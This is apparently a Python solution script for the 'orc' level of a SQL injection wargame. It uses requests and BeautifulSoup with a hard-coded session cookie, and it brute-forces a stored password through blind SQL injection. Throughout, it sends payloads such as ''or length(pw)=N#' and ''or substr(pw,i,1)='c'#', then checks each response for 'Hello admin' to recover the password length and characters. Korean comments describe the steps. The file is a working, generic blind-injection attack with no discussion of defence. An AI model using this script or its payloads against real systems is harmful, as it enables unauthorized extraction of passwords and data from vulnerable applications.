import requests
from bs4 import BeautifulSoup

url = 'https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php'
session_id = 'PHPSESSID'
session_value = '6gcgn398dj07c952vsauvmndi3'
true_query = ' Hello admin' # Blind SQL i 시도 시 '참' 의 문자열
cookies = {session_id : session_value}
parameter = 'pw' #Blind sql i 시도 파라미터
bruteforce=[0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f','g','h','i'
            ,'j','k','l','m','n','o','p','q','r','s','t','u','v'
            ,'w','x','y','z']

def Request(sql_query):
    data = {parameter: sql_query,
            }
    res = requests.get(url, cookies=cookies, params=data)
    html = res.text
    result = BeautifulSoup(html, 'html.parser')
    result = result.prettify()
    result_list = result.split('\n')
    return result_list

def Pw_string(pw_length):
    pw_string=[] # pw string 변수
    str_num = 1 # substr(pw,?,1) ? 에 들어갈 매개변수
    k = -1 # bruteforce list index 변수
    count = 0
    sw = 0 # while loop 제어 변수
    while count < pw_length:
        while 1: # SQL injection !
            k = k + 1
            sql_query = "'or substr(pw," + str(str_num) + ",1)='" + str(bruteforce[k]) + "'#" # SQL Query
            result_list = Request(sql_query) # Request 함수 호출 후 html 파싱결과 list 로 반환
            for i in result_list:
                if true_query in i: # '참'(Hello admin) 의 문자열이 출력됬다면 bruteforce 리스트의 [k] index 값이 pw 의 '값'
                    print(sql_query)
                    pw_string.append(bruteforce[k])
                    k = -1
                    str_num = str_num + 1
                    count = count + 1
                    sw = 1
                    #print(pw_string)
            if sw == 1:
                break
    print(pw_string) # -> pw 출력.
def Pw_length():
    pw_length = 0 # pw length
    sw = 0 # while loop 제어
    while 1:
        pw_length = pw_length + 1
        sql_query = "'or length(pw)="+str(pw_length)+'#'
        result_list = Request(sql_query) # SQL injection !
        for i in result_list:
            if true_query in i: # '참'(Hello admin) 의 문자열이 출력됬다면 현재 pw 크기 출력.
                print('pw 크기 : %d'%pw_length) # -> pw 크기 출력
                sw = 1
        if sw == 1:  # pw 갯수를 다 찾으면 반복 while loop 종료
            break
    return Pw_string(pw_length)

Pw_length()

